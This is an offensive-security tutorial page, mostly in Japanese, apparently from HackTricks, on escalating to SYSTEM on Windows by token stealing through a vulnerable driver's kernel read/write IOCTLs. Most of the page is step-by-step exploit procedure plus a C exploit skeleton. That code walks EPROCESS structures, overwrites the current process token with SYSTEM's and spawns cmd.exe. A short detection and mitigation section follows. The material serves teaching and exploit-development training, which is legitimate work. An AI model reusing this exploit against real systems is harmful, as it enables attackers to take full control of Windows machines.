# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## 概要

脆弱なドライバが攻撃者に任意のカーネル読み取り/書き込みプリミティブを与える IOCTL を露出している場合、SYSTEM（NT AUTHORITY\SYSTEM）への昇格は SYSTEM のアクセス Token を盗むことで達成できることが多いです。この手法は、SYSTEM プロセスの EPROCESS から現在のプロセスの EPROCESS に Token ポインタをコピーします。

なぜ動作するか:
- 各プロセスは EPROCESS 構造体を持ち、その中に（他のフィールドとともに）Token（実際にはトークンオブジェクトへの EX_FAST_REF）が含まれる。
- SYSTEM プロセス（PID 4）はすべての権限が有効になったトークンを保持している。
- 現在のプロセスの EPROCESS.Token を SYSTEM のトークンポインタで置き換えると、現在のプロセスは即座に SYSTEM として実行される。

> EPROCESS のオフセットは Windows のバージョンによって異なります。動的に決定する（symbols）か、バージョン固有の定数を使用してください。また EPROCESS.Token が EX_FAST_REF であること（下位 3 ビットが参照カウントフラグとして使われている）を忘れないでください。

## 大まかな手順

1) ntoskrnl.exe のベースを見つけ、PsInitialSystemProcess のアドレスを解決する。
- ユーザーモードからは、NtQuerySystemInformation(SystemModuleInformation) や EnumDeviceDrivers を使ってロードされたドライバのベースを取得する。
- カーネルベースに PsInitialSystemProcess のオフセット（symbols/リバースから取得）を加えて、そのアドレスを得る。
2) PsInitialSystemProcess のポインタを読み取る → これは SYSTEM の EPROCESS へのカーネルポインタである。
3) SYSTEM の EPROCESS から UniqueProcessId と ActiveProcessLinks のオフセットを読み取り、EPROCESS 構造体の二重リンクリスト（ActiveProcessLinks.Flink/Blink）をたどって、UniqueProcessId が GetCurrentProcessId() と等しい EPROCESS を見つけるまで進む。以下を保持する:
- EPROCESS_SYSTEM（SYSTEM のため）
- EPROCESS_SELF（現在のプロセスのため）
4) SYSTEM トークンの値を読む: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- 下位 3 ビットをマスクする: Token_SYS_masked = Token_SYS & ~0xF（ビルドによっては ~0xF や ~0x7 が一般的；x64 では下位 3 ビットが使われる — 0xFFFFFFFFFFFFFFF8 マスク）。
5) Option A (common): 現在のトークンの下位 3 ビットを保持し、SYSTEM のポインタにそれらを付けることで埋め込み参照カウントの整合性を保つ。
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) カーネル書き込みプリミティブを使って Token_NEW を (EPROCESS_SELF + TokenOffset) に書き戻す。
7) 現在のプロセスはこれで SYSTEM になっている。必要に応じて新しい cmd.exe や powershell.exe を起動して確認する。

## 擬似コード

Below is a skeleton that only uses two IOCTLs from a vulnerable driver, one for 8-byte kernel read and one for 8-byte kernel write. Replace with your driver’s interface.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
注意:
- Offsets: ターゲットの PDBs、またはランタイムのシンボルローダーとともに WinDbg の `dt nt!_EPROCESS` を使用して正しいオフセットを取得してください。盲目的にハードコードしないでください。
- Mask: x64 では token は EX_FAST_REF です; 下位 3 ビットは参照カウントビットです。token の元の下位ビットを保持することで即時の参照カウント不整合を避けられます。
- Stability: 現在のプロセスを昇格させることを優先してください。短命なヘルパーを昇格させると、そのプロセスが終了した際に SYSTEM を失う可能性があります。

## 検出 & 対策
- 強力な IOCTL を公開する署名されていない、または信頼できないサードパーティ製ドライバのロードが根本原因です。
- Kernel Driver Blocklist (HVCI/CI)、DeviceGuard、および Attack Surface Reduction ルールは脆弱なドライバのロードを防止できます。
- EDR は arbitrary read/write を実装する疑わしい IOCTL シーケンスや token の入れ替えを監視できます。

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
